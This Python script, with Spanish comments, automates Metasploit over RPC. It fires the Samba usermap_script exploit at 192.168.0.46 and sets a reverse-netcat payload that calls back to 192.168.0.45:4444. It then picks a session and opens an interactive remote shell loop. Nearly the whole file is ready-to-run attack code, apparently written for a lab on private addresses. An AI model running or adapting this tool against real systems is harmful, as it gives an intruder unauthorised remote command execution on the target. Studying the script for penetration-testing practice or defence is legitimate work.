# __IMPORT__#
from pymetasploit3.msfrpc import *
import time 


# __MAIN CODE__ #
class metasploitTool:
    def __init__(self, password='password', port=55552):
        self.client = self.connect(password, port=port)
    
    def connect(self, password, port): #  conectamos con MSGRPC
        try:
            client = MsfRpcClient(password, port=port)
            return client
        except Exception:
            print('Can not Connect to client.\nPlease verify that msgrpc is running')
        
    def set_exploit(self, t_ip, exploit='exploit/multi/samba/usermap_script'):
        self.exploit = self.client.modules.use('exploit', exploit)
        self.exploit['RHOSTS'] = t_ip
        
    def showExploit_Options(self):
        from toolPrint import listPrint
        listPrint(self.exploit.options)
    
    def set_payload(self, a_ip, a_port='4444', payload='cmd/unix/reverse_netcat'):
        # establecemos y configuramos el payload
        self.pl = self.client.modules.use('payload', payload)
        self.pl['LHOST'] = a_ip
        self.pl['LPORT'] = a_port
        
        # Creamos  el objeto console
        cnsl_id = self.client.consoles.console().cid
        self.cnsl = self.client.consoles.console(cnsl_id)
        
    def runPayload(self):
        try:
            self.exploit.execute(payload=self.pl)
            time.sleep(5)
            print('[+] Payload executed!')
        except Exception as e:
            print(e)
        
    def print_payloads(self, to_var=False):
        from toolPrint import listPrint
        if to_var:
            return self.exploit.targetpayloads()
        else:
            listPrint(self.exploit.targetpayloads())
        
    def selectSession(self, p=False):
        if p:
            from toolPrint import dictPrint
            dictPrint(self.client.sessions.list)
        session =  str(input('Select a session to Connect:\n>>> '))
        return self.client.sessions.session(session)
    
    def use_shell(self, shell):
        command = 'cat /etc/issue'
        print("Use 'exit()' to finish the connection.")
        while command != 'exit()':
            shell.write(command)
            print(shell.read())
            command = input(">>> ")
            

# __MAIN RUN__#
if __name__ == '__main__':
    import sys
    #self_ip = input("Your IP:\n>>> ")
    #password = input("Introduce el password del servicio MSGRPC: ")
    #port = input("Introduce el puerto donde se ejecuta el servicio MSGRPC: ")
    metasploit = metasploitTool()
    metasploit.set_exploit('192.168.0.46')
    metasploit.set_payload('192.168.0.45')
    metasploit.runPayload()
    shell = metasploit.selectSession()
    metasploit.use_shell(shell)
    #metasploit.showExploit_Options()
    #metasploit.print_payloads()